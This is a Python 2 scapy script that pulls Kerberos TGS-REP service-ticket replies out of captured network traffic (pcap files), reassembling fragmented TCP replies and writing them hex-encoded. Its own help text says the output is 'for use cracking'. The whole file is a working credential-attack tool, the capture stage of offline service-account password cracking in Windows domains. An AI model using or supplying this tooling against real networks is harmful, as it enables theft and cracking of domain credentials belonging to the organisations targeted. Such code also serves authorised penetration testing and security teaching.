#!/usr/local/bin/python2 -tt

from scapy.all import *
import struct

MESSAGETYPEOFFSETUDP = 17
MESSAGETYPEOFFSETTCP = 21
DEBUG = True

TGS_REP = chr(13)

def findkerbpayloads(packets, verbose=False):
	kploads = []
	i = 1
	unfinished = {}
	for p in packets:
		# UDP
		if p.haslayer(UDP) and p.sport == 88 and p[UDP].load[MESSAGETYPEOFFSETUDP] == TGS_REP:
			if verbose: print "found UDP payload of size %i" % len(p[UDP].load) 
			kploads.append(p[UDP].load)

		#TCP
		elif p.haslayer(TCP) and p.sport == 88 and p[TCP].flags & 23== 16: #ACK Only, ignore push (8), urg (32), and ECE (64+128)
			# assumes that each TCP packet contains the full payload

			if len(p[TCP].load) > MESSAGETYPEOFFSETTCP and p[TCP].load[MESSAGETYPEOFFSETTCP] == TGS_REP:
				# found start of new TGS-REP
				size = struct.unpack(">I", p[TCP].load[:4])[0]
				if size + 4 == len(p[TCP].load):
					kploads.append(p[TCP].load[4:size+4]) # strip the size field
				else:
					#print 'ERROR: Size is incorrect: %i vs %i' % (size, len(p[TCP].load))
					unfinished[(p[IP].src, p[IP].dst, p[TCP].dport)] = (p[TCP].load[4:size+4], size)
				if verbose: print "found TCP payload of size %i" % size
			elif unfinished.has_key((p[IP].src, p[IP].dst, p[TCP].dport)):
				ticketdata, size = unfinished.pop((p[IP].src, p[IP].dst, p[TCP].dport))
				ticketdata += p[TCP].load
				#print "cont: %i %i" % (len(ticketdata), size)
				if len(ticketdata) == size:
					kploads.append(ticketdata)
				elif len(ticketdata) < size:
					unfinished[(p[IP].src, p[IP].dst, p[TCP].dport)] = (ticketdata, size)
				else:
					# OH NO! Oversized!
					print 'Too much data received! Source: %s Dest: %s DPort %i' % (p[IP].src, p[IP].dst, p[TCP].dport)


	return kploads



if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Find TGS_REP packets in a pcap file and write them for use cracking')
	parser.add_argument('-f', '--pcap', dest='pcaps', action='append', required=True,
					metavar='PCAPFILE', #type=file, #argparse.FileType('r'), 
					help='a file to search for Kerberos TGS_REP packets')
	parser.add_argument('-w', '--outputfile', dest='outfile', action='store', required=True, 
					metavar='OUTPUTFILE', type=argparse.FileType('w'), 
					help='the output file')
	parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
					help='display verbose messages')

	args = parser.parse_args()
	kploads = []
	for f in args.pcaps:
		packets = rdpcap(f)
		kploads += findkerbpayloads(packets, args.verbose)
	if len(kploads) == 0:
		print 'no payloads found'
	else:
		print 'writing %i hex encoded payloads to %s' % (len(kploads), args.outfile.name)
	for p in kploads:
		args.outfile.write(p.encode('hex') + '\n')

	

